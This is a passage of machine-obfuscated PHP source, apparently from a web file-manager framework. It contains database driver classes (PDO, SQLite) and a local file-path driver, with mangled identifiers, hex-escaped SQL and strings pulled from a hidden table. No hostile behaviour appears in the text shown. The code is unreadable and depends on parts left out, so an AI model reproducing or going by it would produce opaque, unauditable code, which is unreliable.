array($¤ğÑİ·à[32] => $Óì¹–—Ó[$¤ğÑİ·à[31]], $¤ğÑİ·à[33] => $Óì¹–—Ó[$¤ğÑİ·à[34]], $¤ğÑİ·à[35] => (bool) ($Óì¹–—Ó[$¤ğÑİ·à[36]] === $¤ğÑİ·à[12]), $¤ğÑİ·à[37] => $Óì¹–—Ó[$¤ğÑİ·à[38]], $¤ğÑİ·à[39] => strtolower($Óì¹–—Ó[$¤ğÑİ·à[40]]) == $¤ğÑİ·à[41], $¤ğÑİ·à[42] => strtolower($Óì¹–—Ó[$¤ğÑİ·à[43]]) == $¤ğÑİ·à[44]); } } return $Íšù¢²È; } public function getTables($Ø‘ç’»Ä = '') { $Èéš’º¹ =& $_SERVER[´‹ô¯Œ]; $”ÒÉıı“ = !empty($Ø‘ç’»Ä) ? $Èéš’º¹[991] . $Ø‘ç’»Ä . $Èéš’º¹[992] : $Èéš’º¹[993]; $èâÒƒ‡ = $this->query($”ÒÉıı“); $ÇÂ…²ª½ = array(); if ($èâÒƒ‡) { foreach ($èâÒƒ‡ as $‘‹ŒÚ¶Ÿ => $°²¥„”) { $ÇÂ…²ª½[$‘‹ŒÚ¶Ÿ] = current($°²¥„”); } } return $ÇÂ…²ª½; } public function replace($«µó”, $ı¢úã¢­ = array()) { $ö¡ñØ¾” =& $_SERVER[´‹ô¯Œ]; foreach ($«µó” as $éüÔÍé => $è°š£Ãà) { $ÅÀßÀç = $this->parseValue($è°š£Ãà); if (is_scalar($ÅÀßÀç)) { $Ù–Şî»Ê[] = $ÅÀßÀç; $è·ˆÆ™[] = $this->parseKey($éüÔÍé); } } $øÔéŞ–» = $ö¡ñØ¾”[994] . $this->parseTable($ı¢úã¢­[$ö¡ñØ¾”[359]]) . $ö¡ñØ¾”[995] . implode($ö¡ñØ¾”[50], $è·ˆÆ™) . $ö¡ñØ¾”[996] . implode($ö¡ñØ¾”[50], $Ù–Şî»Ê) . $ö¡ñØ¾”[997]; return $this->execute($øÔéŞ–»); } public function insertAll($ÈİÜúÇ, $Áˆ•¥èè = array(), $ÍÅ—Ù¯æ = false) { $×Æğ„Ï =& $_SERVER[´‹ô¯Œ]; if (!is_array($ÈİÜúÇ[0])) { return !1; } $ÇÅÎ¶• = array_keys($ÈİÜúÇ[0]); $µ¬ùƒÚÌ = array(); foreach ($ÈİÜúÇ as $şé‹ÁÉ§) { $òÖÍæµ = array(); foreach ($şé‹ÁÉ§ as $Ã¶ïÅË’ => $†ç¾¯‡«) { $†ç¾¯‡« = $this->parseValue($†ç¾¯‡«); if (is_scalar($†ç¾¯‡«)) { $òÖÍæµ[] = $†ç¾¯‡«; } } $µ¬ùƒÚÌ[] = $×Æğ„Ï[340] . implode($×Æğ„Ï[50], $òÖÍæµ) . $×Æğ„Ï[997]; } array_walk($ÇÅÎ¶•, array($this, $×Æğ„Ï[998])); $éØ’ñó‘ = $ÍÅ—Ù¯æ ? $×Æğ„Ï[999] : $×Æğ„Ï[1000]; $Úö¼¨úÌ = $éØ’ñó‘ . $×Æğ„Ï[1001] . $this->parseTable($Áˆ•¥èè[$×Æğ„Ï[359]]) . $×Æğ„Ï[995] . implode($×Æğ„Ï[50], $ÇÅÎ¶•) . $×Æğ„Ï[1002] . implode($×Æğ„Ï[50], $µ¬ùƒÚÌ); return $this->execute($Úö¼¨úÌ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $«“Ì§¨Ş =& $_SERVER[´‹ô¯Œ]; $this->error = $this->_linkID->errno . $«“Ì§¨Ş[4] . $this->_linkID->error; if ($«“Ì§¨Ş[12] != $this->queryStr) { $this->error .= LNG($«“Ì§¨Ş[48]) . $this->queryStr; } think_trace($this->error, $«“Ì§¨Ş[12], $«“Ì§¨Ş[49]); return $this->error; } public function escapeString($Ğ°‡Ê×›) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Ğ°‡Ê×›); } else { return addslashes($Ğ°‡Ê×›); } } public function parseKey(&$õÄÎÆµâ, $¥•„Ó“« = true) { $ÏŸ«‘éï =& $_SERVER[´‹ô¯Œ]; if ($¥•„Ó“«) { $õÄÎÆµâ = $this->parseKeyCheck($õÄÎÆµâ); } if ($õÄÎÆµâ != $ÏŸ«‘éï[223] && !preg_match($ÏŸ«‘éï[1003], $õÄÎÆµâ)) { $õÄÎÆµâ = $ÏŸ«‘éï[464] . trim($õÄÎÆµâ, $ÏŸ«‘éï[464]) . $ÏŸ«‘éï[464]; } return $õÄÎÆµâ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($”½ïëµÏ = '') { $Ÿİ¢ŠìÚ =& $_SERVER[´‹ô¯Œ]; if (!class_exists($Ÿİ¢ŠìÚ[1006])) { think_exception(think_lang($Ÿİ¢ŠìÚ[14]) . $Ÿİ¢ŠìÚ[1007]); } if (!empty($”½ïëµÏ)) { $this->config = $”½ïëµÏ; if (empty($this->config[$Ÿİ¢ŠìÚ[17]])) { $this->config[$Ÿİ¢ŠìÚ[17]] = array(); } } } public function connect($…ßÅÙæ = '', $Ô›Å‘š€ = 0) { $îóÉĞÔ =& $_SERVER[´‹ô¯Œ]; if (!isset($this->linkID[$Ô›Å‘š€])) { if (empty($…ßÅÙæ)) { $…ßÅÙæ = $this->config; } $ÃÁ§¸Œ¸ = !empty($…ßÅÙæ[$îóÉĞÔ[17]][$îóÉĞÔ[18]]) ? $…ßÅÙæ[$îóÉĞÔ[17]][$îóÉĞÔ[18]] : $this->pconnect; if ($ÃÁ§¸Œ¸) { $…ßÅÙæ[$îóÉĞÔ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Ô›Å‘š€] = new PDO($…ßÅÙæ[$îóÉĞÔ[1008]], $…ßÅÙæ[$îóÉĞÔ[980]], $…ßÅÙæ[$îóÉĞÔ[981]], $…ßÅÙæ[$îóÉĞÔ[17]]); } catch (PDOException $†«´ªè¶) { think_exception($†«´ªè¶->getMessage()); } $this->dbType = $this->_getDsnType($…ßÅÙæ[$îóÉĞÔ[1008]]); if (in_array($this->dbType, array($îóÉĞÔ[1009], $îóÉĞÔ[1010], $îóÉĞÔ[1011], $îóÉĞÔ[1012]))) { think_exception($îóÉĞÔ[1013] . $this->dbType . $îóÉĞÔ[1014] . $this->dbType . $îóÉĞÔ[1015]); } if (!$this->linkID[$Ô›Å‘š€]) { think_exception($îóÉĞÔ[1016]); } try { $this->linkID[$Ô›Å‘š€]->exec($îóÉĞÔ[1017] . think_config($îóÉĞÔ[983])); } catch (Exception $†«´ªè¶) { } $this->connected = !0; if (1 != think_config($îóÉĞÔ[22])) { unset($this->config); } } return $this->linkID[$Ô›Å‘š€]; } public function free() { $this->PDOStatement = null; } public function query($şù¼‚¢Û, $ğ¥‹’ı = array()) { $÷Á­òàü =& $_SERVER[´‹ô¯Œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $şù¼‚¢Û; if (!empty($ğ¥‹’ı)) { $this->queryStr .= $÷Á­òàü[1018] . print_r($ğ¥‹’ı, !0) . $÷Á­òàü[1019]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($÷Á­òàü[23], 1); think_status($÷Á­òàü[24]); $this->PDOStatement = $this->_linkID->prepare($şù¼‚¢Û); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÛòŒÓ¼  = $this->PDOStatement->execute($ğ¥‹’ı); $this->debug(); if (!1 === $ÛòŒÓ¼ ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($´ó´­à¼, $”¯¹Ò·´ = array()) { $ôÀáî®È =& $_SERVER[´‹ô¯Œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $´ó´­à¼; if (!empty($”¯¹Ò·´)) { $this->queryStr .= $ôÀáî®È[1018] . print_r($”¯¹Ò·´, !0) . $ôÀáî®È[1019]; } $ğÜ¦îœÎ = !1; if ($this->dbType == $ôÀáî®È[1012]) { if (preg_match($ôÀáî®È[1020], $this->queryStr, $ó°³û¾)) { $this->table = think_config($ôÀáî®È[1021]) . str_ireplace(think_config($ôÀáî®È[1022]), $ôÀáî®È[457], $ó°³û¾[2]); $ğÜ¦îœÎ = (bool) $this->query($ôÀáî®È[1023] . strtoupper($this->table) . $ôÀáî®È[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ôÀáî®È[25], 1); think_status($ôÀáî®È[24]); $this->PDOStatement = $this->_linkID->prepare($´ó´­à¼); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $–á˜ĞÈ = $this->PDOStatement->execute($”¯¹Ò·´); $this->debug(); if (!1 === $–á˜ĞÈ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ğÜ¦îœÎ || preg_match($ôÀáî®È[1024], $´ó´­à¼)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ùªµ“ÈŞ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ùªµ“ÈŞ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $°Ö“¸şø = $this->_linkID->rollback(); $this->transTimes = 0; if (!$°Ö“¸şø) { $this->error(); return !1; } } return !0; } private function getAll() { $Ù‹ùüß = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ù‹ùüß); return $Ù‹ùüß; } public function getFields($”šéŸ¡ó) { $îóº€“© =& $_SERVER[´‹ô¯Œ]; $this->initConnect(!0); if (think_config($îóº€“©[1025])) { $â–ˆŒ¬ã = str_replace($îóº€“©[1026], $”šéŸ¡ó, think_config($îóº€“©[1025])); } else { switch ($this->dbType) { case $îóº€“©[1009]: case $îóº€“©[1027]: $â–ˆŒ¬ã = "\123\x45\x4c\105\103\124\40\40\40\143\x6f\x6c\165\x6d\x6e\137\156\141\155\x65\40\x61\x73\x20\47\x4e\x61\155\145\x27\54\x20\40\40\144\x61\164\141\x5f\164\171\x70\145\40\x61\x73\x20\x27\124\171\160\145\x27\54\40\40\x20\x63\x6f\154\165\155\156\137\144\x65\146\x61\165\154\x74\x20\x61\163\40\x27\x44\x65\146\x61\x75\154\x74\47\54\x20\40\40\x69\x73\137\x6e\165\x6c\x6c\141\x62\x6c\x65\40\x61\163\x20\47\116\165\x6c\x6c\x27\12\x9\x9\x46\x52\x4f\115\x9\151\x6e\146\x6f\162\x6d\x61\164\x69\x6f\x6e\x5f\x73\x63\150\x65\x6d\x61\56\164\141\x62\x6c\x65\x73\x20\101\x53\40\x74\xa\11\11\112\117\111\116\11\x69\156\x66\157\162\155\141\x74\151\157\156\137\x73\143\150\x65\155\141\56\143\x6f\154\x75\x6d\156\163\x20\101\x53\40\143\xa\x9\11\117\116\40\40\164\56\164\141\142\x6c\145\x5f\x63\x61\164\141\x6c\x6f\147\40\75\x20\143\56\164\x61\x62\154\x65\x5f\143\141\164\x61\x6c\x6f\x67\xa\11\11\x41\x4e\104\40\164\56\164\141\142\154\x65\137\x73\143\x68\145\155\x61\x20\75\x20\x63\x2e\164\x61\142\x6c\145\137\x73\143\150\x65\x6d\x61\12\11\x9\101\x4e\104\x20\164\x2e\x74\141\142\x6c\145\137\156\141\155\145\x20\x3d\40\143\x2e\164\141\x62\154\145\137\x6e\x61\x6d\x65\12\11\11\127\x48\105\x52\x45\40\x20\40\x74\x2e\164\x61\142\x6c\145\137\x6e\141\155\145\x20\75\x20\x27{$”šéŸ¡ó}\x27"; break; case $îóº€“©[1028]: $â–ˆŒ¬ã = $îóº€“©[1029] . $”šéŸ¡ó . $îóº€“©[1030]; break; case $îóº€“©[1010]: case $îóº€“©[1012]: $â–ˆŒ¬ã = $îóº€“©[1031] . $îóº€“©[1032] . $îóº€“©[1033] . strtoupper($”šéŸ¡ó) . $îóº€“©[1034] . strtoupper($”šéŸ¡ó) . $îóº€“©[1035]; break; case $îóº€“©[1036]: $â–ˆŒ¬ã = $îóº€“©[1037] . $”šéŸ¡ó . $îóº€“©[1038]; break; case $îóº€“©[1011]: break; case $îóº€“©[1039]: default: $â–ˆŒ¬ã = $îóº€“©[1040] . ($this->dbType == $îóº€“©[1039] ? "\x60{$”šéŸ¡ó}\140" : $”šéŸ¡ó); } } $‘¯½îŞ¤ = $this->query($â–ˆŒ¬ã); $³¦¦¡¦è = array(); if ($‘¯½îŞ¤) { foreach ($‘¯½îŞ¤ as $å‡‚Ü‰ => $ÅÙ°Ä—æ) { $ÅÙ°Ä—æ = array_change_key_case($ÅÙ°Ä—æ); $ÅÙ°Ä—æ[$îóº€“©[32]] = isset($ÅÙ°Ä—æ[$îóº€“©[32]]) ? $ÅÙ°Ä—æ[$îóº€“©[32]] : $îóº€“©[457]; $ÅÙ°Ä—æ[$îóº€“©[33]] = isset($ÅÙ°Ä—æ[$îóº€“©[33]]) ? $ÅÙ°Ä—æ[$îóº€“©[33]] : $îóº€“©[457]; $¸°úó”Õ = isset($ÅÙ°Ä—æ[$îóº€“©[353]]) ? $ÅÙ°Ä—æ[$îóº€“©[353]] : $ÅÙ°Ä—æ[$îóº€“©[32]]; $³¦¦¡¦è[$¸°úó”Õ] = array($îóº€“©[32] => $¸°úó”Õ, $îóº€“©[33] => $ÅÙ°Ä—æ[$îóº€“©[33]], $îóº€“©[35] => (bool) (isset($ÅÙ°Ä—æ[$îóº€“©[106]]) && $ÅÙ°Ä—æ[$îóº€“©[106]] === $îóº€“©[12] || isset($ÅÙ°Ä—æ[$îóº€“©[35]]) && $ÅÙ°Ä—æ[$îóº€“©[35]] === $îóº€“©[12]), $îóº€“©[37] => isset($ÅÙ°Ä—æ[$îóº€“©[37]]) ? $ÅÙ°Ä—æ[$îóº€“©[37]] : (isset($ÅÙ°Ä—æ[$îóº€“©[56]]) ? $ÅÙ°Ä—æ[$îóº€“©[56]] : $îóº€“©[457]), $îóº€“©[39] => isset($ÅÙ°Ä—æ[$îóº€“©[97]]) ? strtolower($ÅÙ°Ä—æ[$îóº€“©[97]]) == $îóº€“©[41] : (isset($ÅÙ°Ä—æ[$îóº€“©[57]]) ? $ÅÙ°Ä—æ[$îóº€“©[57]] : !1), $îóº€“©[42] => isset($ÅÙ°Ä—æ[$îóº€“©[1041]]) ? strtolower($ÅÙ°Ä—æ[$îóº€“©[1041]]) == $îóº€“©[44] : (isset($ÅÙ°Ä—æ[$îóº€“©[97]]) ? $ÅÙ°Ä—æ[$îóº€“©[97]] : !1)); } } return $³¦¦¡¦è; } public function getTables($Íš±´Àâ = '') { $öÂ¾¥‚§ =& $_SERVER[´‹ô¯Œ]; if (think_config($öÂ¾¥‚§[1042])) { $éíµ¾Øµ = str_replace($öÂ¾¥‚§[1043], $Íš±´Àâ, think_config($öÂ¾¥‚§[1042])); } else { switch ($this->dbType) { case $öÂ¾¥‚§[1010]: case $öÂ¾¥‚§[1012]: $éíµ¾Øµ = $öÂ¾¥‚§[1044]; break; case $öÂ¾¥‚§[1009]: case $öÂ¾¥‚§[1027]: $éíµ¾Øµ = $öÂ¾¥‚§[1045]; break; case $öÂ¾¥‚§[1036]: $éíµ¾Øµ = $öÂ¾¥‚§[1046]; break; case $öÂ¾¥‚§[1011]: think_exception(think_lang($öÂ¾¥‚§[1047]) . $öÂ¾¥‚§[1048]); break; case $öÂ¾¥‚§[1028]: $éíµ¾Øµ = $öÂ¾¥‚§[45] . $öÂ¾¥‚§[46] . $öÂ¾¥‚§[47]; break; case $öÂ¾¥‚§[1039]: default: if (!empty($Íš±´Àâ)) { $éíµ¾Øµ = $öÂ¾¥‚§[991] . $Íš±´Àâ . $öÂ¾¥‚§[992]; } else { $éíµ¾Øµ = $öÂ¾¥‚§[993]; } } } $ßê¼¼Çœ = $this->query($éíµ¾Øµ); $Ş ê“ÒÃ = array(); foreach ($ßê¼¼Çœ as $ç»À“æü => $•Ÿ™Å·¬) { $Ş ê“ÒÃ[$ç»À“æü] = current($•Ÿ™Å·¬); } return $Ş ê“ÒÃ; } protected function parseLimit($Ú¨Âø™) { $¹“ˆäÑş =& $_SERVER[´‹ô¯Œ]; $³í’Ğà = $¹“ˆäÑş[12]; if (!empty($Ú¨Âø™)) { switch ($this->dbType) { case $¹“ˆäÑş[1036]: case $¹“ˆäÑş[1028]: $Ú¨Âø™ = explode($¹“ˆäÑş[50], $Ú¨Âø™); if (count($Ú¨Âø™) > 1) { $³í’Ğà .= $¹“ˆäÑş[51] . $Ú¨Âø™[1] . $¹“ˆäÑş[52] . $Ú¨Âø™[0] . $¹“ˆäÑş[53]; } else { $³í’Ğà .= $¹“ˆäÑş[51] . $Ú¨Âø™[0] . $¹“ˆäÑş[53]; } break; case $¹“ˆäÑş[1009]: case $¹“ˆäÑş[1027]: break; case $¹“ˆäÑş[1011]: break; case $¹“ˆäÑş[1010]: case $¹“ˆäÑş[1012]: break; case $¹“ˆäÑş[1039]: default: $³í’Ğà .= $¹“ˆäÑş[51] . $Ú¨Âø™ . $¹“ˆäÑş[53]; } } return $³í’Ğà; } public function parseKey(&$¬¢˜ãæÜ, $Õîå±¥ = true) { $ÈÆÍî×Ù =& $_SERVER[´‹ô¯Œ]; if ($Õîå±¥) { $¬¢˜ãæÜ = $this->parseKeyCheck($¬¢˜ãæÜ); } if ($this->dbType == $ÈÆÍî×Ù[1039]) { if ($¬¢˜ãæÜ != $ÈÆÍî×Ù[223] && !preg_match($ÈÆÍî×Ù[1003], $¬¢˜ãæÜ)) { $¬¢˜ãæÜ = $ÈÆÍî×Ù[464] . trim($¬¢˜ãæÜ, $ÈÆÍî×Ù[464]) . $ÈÆÍî×Ù[464]; } return $¬¢˜ãæÜ; } else { return parent::parseKey($¬¢˜ãæÜ, $Õîå±¥); } } public function close() { $this->_linkID = null; } public function error() { $Ÿ‰¦Çß =& $_SERVER[´‹ô¯Œ]; if ($this->PDOStatement) { $øÇ·¿½ = $this->PDOStatement->errorInfo(); $this->error = $øÇ·¿½[1] . $Ÿ‰¦Çß[4] . $øÇ·¿½[2]; } else { $this->error = $Ÿ‰¦Çß[12]; } if ($Ÿ‰¦Çß[12] != $this->queryStr) { $this->error .= LNG($Ÿ‰¦Çß[48]) . $this->queryStr; } think_trace($this->error, $Ÿ‰¦Çß[12], $Ÿ‰¦Çß[49]); return $this->error; } public function escapeString($Ê²Ö××Á) { $˜ëëë›î =& $_SERVER[´‹ô¯Œ]; switch ($this->dbType) { case $˜ëëë›î[1036]: case $˜ëëë›î[1009]: case $˜ëëë›î[1027]: case $˜ëëë›î[1039]: return addslashes($Ê²Ö××Á); case $˜ëëë›î[1011]: case $˜ëëë›î[1028]: case $˜ëëë›î[1010]: case $˜ëëë›î[1012]: return str_ireplace($˜ëëë›î[58], $˜ëëë›î[59], $Ê²Ö××Á); } } protected function parseValue($É€‚Û×) { $€°òã¿¥ =& $_SERVER[´‹ô¯Œ]; if (is_string($É€‚Û×)) { $şèÑøû¤ = strpos($É€‚Û×, $€°òã¿¥[4]) === 0 && in_array($É€‚Û×, array_keys($this->bind)); $É€‚Û× = $şèÑøû¤ ? $this->escapeString($É€‚Û×) : $€°òã¿¥[1049] . $this->escapeString($É€‚Û×) . $€°òã¿¥[1049]; } elseif (isset($É€‚Û×[0]) && is_string($É€‚Û×[0]) && strtolower($É€‚Û×[0]) == $€°òã¿¥[375]) { $É€‚Û× = $this->escapeString($É€‚Û×[1]); } elseif (is_array($É€‚Û×)) { $É€‚Û× = array_map(array($this, $€°òã¿¥[1050]), $É€‚Û×); } elseif (is_bool($É€‚Û×)) { $É€‚Û× = $É€‚Û× ? $€°òã¿¥[91] : $€°òã¿¥[231]; } elseif (is_null($É€‚Û×)) { $É€‚Û× = $€°òã¿¥[106]; } return $É€‚Û×; } public function getLastInsertId() { $™ˆÀ“Å° =& $_SERVER[´‹ô¯Œ]; switch ($this->dbType) { case $™ˆÀ“Å°[1036]: case $™ˆÀ“Å°[1028]: case $™ˆÀ“Å°[1009]: case $™ˆÀ“Å°[1027]: case $™ˆÀ“Å°[1011]: case $™ˆÀ“Å°[1039]: return $this->_linkID->lastInsertId(); case $™ˆÀ“Å°[1010]: case $™ˆÀ“Å°[1012]: $¾¼Ú—ƒ² = $this->table; $ÛâÄü¾Ş = $this->query("\x53\105\x4c\105\x43\x54\40{$¾¼Ú—ƒ²}\x2e\143\x75\162\x72\x76\141\x6c\x20\x63\165\162\x72\166\x61\154\40\x46\x52\x4f\x4d\x20\144\165\x61\154"); return $ÛâÄü¾Ş ? $ÛâÄü¾Ş[0][$™ˆÀ“Å°[1051]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($‰Ùå­Òï) { $ùî¼‰Æ‡ =& $_SERVER[´‹ô¯Œ]; if (!CacheLock::fileLock($ùî¼‰Æ‡[13])) { return !1; } $§¤ê·‚ = parent::query($‰Ùå­Òï); CacheLock::fileUnLock($ùî¼‰Æ‡[13]); return $§¤ê·‚; } public function execute($“È¸ùË) { $©§ĞĞÕ£ =& $_SERVER[´‹ô¯Œ]; if (!CacheLock::fileLock($©§ĞĞÕ£[13])) { return !1; } $½‡Û“™ = parent::execute($“È¸ùË); CacheLock::fileUnLock($©§ĞĞÕ£[13]); return $½‡Û“™; } } goto d ¢¼§„; c©¯½øÏÒ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ó˜’ÏéÌ) { if (substr($ó˜’ÏéÌ, 0, 2) == $_SERVER[´‹ô¯Œ][1435]) { $ó˜’ÏéÌ = BASIC_PATH . substr($ó˜’ÏéÌ, 2); } return $ó˜’ÏéÌ; } public function iconvApp($î¸­Œ¯) { $äŠòÆˆ· =& $_SERVER[´‹ô¯Œ]; global $config; return $this->iconvTo($î¸­Œ¯, $config[$äŠòÆˆ·[1464]], $config[$äŠòÆˆ·[1463]]); } public function iconvSystem($õ ßÅğº) { $ñ¬»üœ† =& $_SERVER[´‹ô¯Œ]; global $config; return $this->iconvTo($õ ßÅğº, $config[$ñ¬»üœ†[1463]], $config[$ñ¬»üœ†[1464]]); } public function getPathOuter($ş‘‰‚üÚ) { $™İ¢±Æú =& $_SERVER[´‹ô¯Œ]; $şçô´Ä‹ = $this->iconvApp($this->pathBase); $ş‘‰‚üÚ = $this->iconvApp($ş‘‰‚üÚ); if (substr($şçô´Ä‹, 0, 2) == $™İ¢±Æú[1435]) { $şçô´Ä‹ = BASIC_PATH . substr($şçô´Ä‹, 2); } if (substr($ş‘‰‚üÚ, 0, 2) == $™İ¢±Æú[1435]) { $ş‘‰‚üÚ = BASIC_PATH . substr($ş‘‰‚üÚ, 2); } $şçô´Ä‹ = KodIO::clear($şçô´Ä‹); $ş‘‰‚üÚ = KodIO::clear($ş‘‰‚üÚ); $ş‘‰‚üÚ = substr($ş‘‰‚üÚ, strlen($şçô´Ä‹)); if (empty($this->pathDriver)) { return $ş‘‰‚üÚ; } return $this->pathDriver . $™İ¢±Æú[8] . ltrim($ş‘‰‚üÚ, $™İ¢±Æú[8]); } public function mkfile($ïœ—òÜ, $Ñ¡çŞ­“ = '', $Š¹° ™¡ = REPEAT_RENAME) { $ïœ—òÜ = $this->iconvSystem($ïœ—òÜ); @touch($ïœ—òÜ); if ($Ñ¡çŞ­“) { file_put_contents($ïœ—òÜ, $Ñ¡çŞ­“); } @chmod($ïœ—òÜ, $this->pathAuth); if (is_file($ïœ—òÜ)) { return $this->getPathOuter($ïœ—òÜ); } $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][1475], !0); return !1; } public function mkdir($ˆŞ¦Ü¾µ, $ä ‚ñÙÇ = REPEAT_SKIP) { $ˆŞ¦Ü¾µ = $this->iconvSystem($ˆŞ¦Ü¾µ); if (is_dir($ˆŞ¦Ü¾µ)) { return $this->getPathOuter($ˆŞ¦Ü¾µ); } @mkdir($ˆŞ¦Ü¾µ, $this->pathAuth, !0); @chmod($ˆŞ¦Ü¾µ, $this->pathAuth); if (is_dir($ˆŞ¦Ü¾µ)) { return $this->getPathOuter($ˆŞ¦Ü¾µ); } $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][1475], !0); return !1; } public function copyFile($ÊœŞÓü´, $Ùªçìäñ) { $this->mkdir($this->pathFather($Ùªçìäñ)); $ÊœŞÓü´ = $this->iconvSystem($ÊœŞÓü´); $Ùªçìäñ = $this->iconvSystem($Ùªçìäñ); $ÔÏ°–»§ = copy_64($ÊœŞÓü´, $Ùªçìäñ); @chmod($Ùªçìäñ, $this->pathAuth); if ($ÔÏ°–»§) { return $this->getPathOuter($Ùªçìäñ); } $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][1475], !0); return !1; } public function moveFile($ªùƒŸ°ä, $îÜ…èÒŒ) { $this->mkdir($this->pathFather($îÜ…èÒŒ)); $ªùƒŸ°ä = $this->iconvSystem($ªùƒŸ°ä); $îÜ…èÒŒ = $this->iconvSystem($îÜ…èÒŒ); $ğÆğÛ×Ç = intval(@rename($ªùƒŸ°ä, $îÜ…èÒŒ)); if (!$ğÆğÛ×Ç) { if ($ğÆğÛ×Ç = intval(@copy_64($ªùƒŸ°ä, $îÜ…èÒŒ))) { @unlink($ªùƒŸ°ä); } } @chmod($îÜ…èÒŒ, $this->pathAuth); if ($ğÆğÛ×Ç) { return $this->getPathOuter($îÜ…èÒŒ); } $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][1475], !0); return !1; } public function movePath($€Ä‰ÑÈŠ, $Ëòº·™«, $¯ß€±¿À = false) { $¢¯øéä =& $_SERVER[´‹ô¯Œ]; $€Ä‰ÑÈŠ = $this->iconvSystem($€Ä‰ÑÈŠ); $Ëòº·™« = $this->iconvSystem($Ëòº·™«); $¯ìÓéˆ = rtrim($Ëòº·™«, $¢¯øéä[8]) . $¢¯øéä[8] . ($¯ß€±¿À ? $¯ß€±¿À : get_path_this($€Ä‰ÑÈŠ)); if (file_exists($¯ìÓéˆ)) { return !1; } $•ÜÁ‹ü = intval(@rename($€Ä‰ÑÈŠ, $¯ìÓéˆ)); $•ÜÁ‹ü = file_exists($¯ìÓéˆ); if ($•ÜÁ‹ü) { return $this->getPathOuter($¯ìÓéˆ); } $this->writeLog(__FUNCTION__ . $¢¯øéä[1475], !0); return !1; } public function delFile($õ¢ïÁÕƒ) { $õ¢ïÁÕƒ = $this->iconvSystem($õ¢ïÁÕƒ); if (!@unlink($õ¢ïÁÕƒ)) { @chmod($õ¢ïÁÕƒ, $this->pathAuth); if (@unlink($õ¢ïÁÕƒ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[´‹ô¯Œ][1475], !0); return !1; } return !0; } public function delFolder($…éº®Êê) { $†®Ó¨Öè =& $_SERVER[´‹ô¯Œ]; $…éº®Êê = $this->iconvSystem($…éº®Êê); if (!is_dir($…éº®Êê)) { return !0; } if (!($ëåñÅÌÅ = opendir($…éº®Êê))) { return !1; } while (($¾êÊ€³Ô = readdir($ëåñÅÌÅ)) !== !1) { if ($¾êÊ€³Ô == $†®Ó¨Öè[10] || $¾êÊ€³Ô == $†®Ó¨Öè[1380]) { continue; } $…Â±Æñ÷ = $…éº®Êê . $†®Ó¨Öè[8] . $¾êÊ€³Ô; if (is_file($…Â±Æñ÷) || is_link($…Â±Æñ÷)) { if (!unlink($…Â±Æñ÷)) { chmod($…Â±Æñ÷, $this->pathAuth); if (!unlink($…Â±Æñ÷)) { return !1; } } } else { if (is_dir($…Â±Æñ÷)) { chmod($…Â±Æñ÷, $this->pathAuth); $…Â±Æñ÷ = $this->iconvApp($…Â±Æñ÷); if (!$this->delFolder($…Â±Æñ÷)) { return !1; } } } } closedir($ëåñÅÌÅ); return rmdir($…éº®Êê); } public function rename($ÒÕ§¼ˆ, $à³ê“ƒì) { $îáùª² =& $_SERVER[´‹ô¯Œ]; $ÕÈô„© = $this->fileNameAuto($this->pathFather($ÒÕ§¼ˆ), $à³ê“ƒì); $ÕÈô„© = $this->iconvSystem($ÕÈô„©); $ÒÕ§¼ˆ = $this->iconvSystem($ÒÕ§¼ˆ); $íéšœÒ± = $this->pathFather($ÒÕ§¼ˆ); $¶Ä¯ƒ–ğ = rtrim($íéšœÒ±, $îáùª²[8]) . $îáùª²[8] . $ÕÈô„©; $‹ãíÆğƒ = @rename($ÒÕ§¼ˆ, $¶Ä¯ƒ–ğ); $¶Ä¯ƒ–ğ = $this->iconvApp($¶Ä¯ƒ–ğ); if ($‹ãíÆğƒ) { return $this->getPathOuter($¶Ä¯ƒ–ğ); } $this->writeLog(__FUNCTION__ . $îáùª²[1475], !0); return !1; } public function size($—¬—¸ñò) { $—¬—¸ñò = $this->iconvSystem($—¬—¸ñò); return filesize_64($—¬—¸ñò); } public function info($—ÑÅ•¹Â) { $—ÑÅ•¹Â = $this->iconvSystem($—ÑÅ•¹Â); if ($this->isFolder($—ÑÅ•¹Â)) { return $this->folderInfo($—ÑÅ•¹Â); } else { if ($this->isFile($—ÑÅ•¹Â)) { return $this->fileInfo($—ÑÅ•¹Â); } } return !1; } protected function infoChildren($Æ±œµˆ¡, &$ÈŒÎ¼…, $ßŞ¸‚Œ› = true) { $µñŞñöé =& $_SERVER[´‹ô¯Œ]; check_abort_echo(); $Æ±œµˆ¡ = rtrim($Æ±œµˆ¡, $µñŞñöé[8]) . $µñŞñöé[8]; if ($ßŞ¸‚Œ›) { $Æ±œµˆ¡ = $this->iconvSystem($Æ±œµˆ¡); } if (!($ëİÙŠãØ = @opendir($Æ±œµˆ¡))) { return; } while (($§ ãØ = readdir($ëİÙŠãØ)) !== !1) { if ($§ ãØ == $µñŞñöé[10] || $§ ãØ == 